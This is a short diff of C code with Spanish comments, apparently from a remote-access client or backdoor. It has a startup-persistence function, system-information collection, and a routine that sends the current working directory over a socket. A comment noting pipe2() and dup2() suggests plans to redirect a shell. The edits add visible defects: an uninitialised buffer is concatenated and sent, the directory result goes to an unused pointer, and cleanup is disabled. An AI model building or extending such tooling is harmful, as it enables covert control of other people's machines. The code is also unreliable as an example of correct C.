@@ -17,6 +17,12 @@
 
 int sock;
 
+/*
+pipe2()
+dup2()
+
+*/
+
 // Función para ejecutar al inicio
 int bootRun()
 {
@@ -120,18 +126,22 @@ char* get_system_info() {
 }
 
 void send_cwd() {
-    char *cwd = NULL;
+    char cwd[1024]; // MAX_PATH 256 
+    char *cwd_p = &cwd;
+
     //if (_getcwd(cwd, sizeof(cwd)) == NULL) {
-    if ( (cwd = _getcwd(NULL, 0)) == NULL) {
+    if ( (cwd_p = _getcwd(NULL, 1023)) == NULL) {
         perror("Error al obtener el directorio actual");
         return;
     }
+    
     else {
+        strcat(cwd, "\r\n");
         if (send(sock, cwd, sizeof(cwd), 0) < 0) {
             perror("Error al enviar el directorio actual");
         }
     }
-    free(cwd);
+    //free(cwd);
     fflush(stdout); // Enviar datos de la secuencia de salida estándar de inmediato
 }
 
